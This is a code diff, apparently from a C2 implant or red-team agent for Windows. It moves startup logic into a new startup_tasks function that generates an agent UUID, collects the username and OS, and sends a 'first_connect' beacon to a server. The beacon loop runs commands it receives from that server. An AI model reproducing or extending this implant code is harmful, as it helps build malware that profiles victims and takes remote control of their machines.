@@ -15,7 +15,7 @@
 DWORD execute(HeapStore *heapStorePointer);
 void generate_uuid4(char *agent_id);
 void execution_setup(HeapStore *heapStorePointer);
-
+void startup_tasks(HeapStore *heapStorePointer);
 // ASYNC BEACON!!!
 /*
 Just starts a thread and lets it run each time, incase it fails or is long
@@ -56,18 +56,15 @@ int main()
         return 1;
     }
 
-    generate_uuid4(heapStorePointer->agentStore->agent_id);
-    set_current_username(heapStorePointer, get_env("USERNAME"));
-    set_os(heapStorePointer, get_env("OS"));
-
+    startup_tasks(heapStorePointer);
     // Example of setting the execution mode (you can do this at any point in your code)
     set_execution_mode(EXEC_MODE_SYNC, heapStorePointer); // Initially run synchronously
 
     while (1)
     {
+
         execution_setup(heapStorePointer); // Call the command execution function
         DEBUG_LOG("EXECUTION SUCCESS");
-
         // WhisperSleep(get_sleep_time());
         // Sleep is in MS, so we take the input of sleep time * 1000 to get seconds
         WhisperSleep(1000 * get_sleep_time(heapStorePointer));
@@ -247,6 +244,24 @@ DWORD WINAPI execute(HeapStore *heapStorePointer)
     free(OutboundJsonData); // freeing the strucutre itself: 'OutboundJsonDataStruct* OutboundJsonData = (OutboundJsonDataStruct*)calloc(1, sizeof(OutboundJsonDataStruct));'
 
     return 0;
+}
+
+/*
+Startup tasks to do for the agent.
+
+*/
+void startup_tasks(HeapStore *heapStorePointer)
+{
+    DEBUG_LOG("STARTUP TASKS")
+    // generate a uuid for this agent
+    generate_uuid4(heapStorePointer->agentStore->agent_id);
+
+    // Get needed metadata for checkin
+    set_current_username(heapStorePointer, get_env("USERNAME"));
+    set_os(heapStorePointer, get_env("OS"));
+
+    // send init post to get metadata into server
+    agent_send_now(heapStorePointer, "first_connect");
 }
 
 void generate_uuid4(char *uuid)
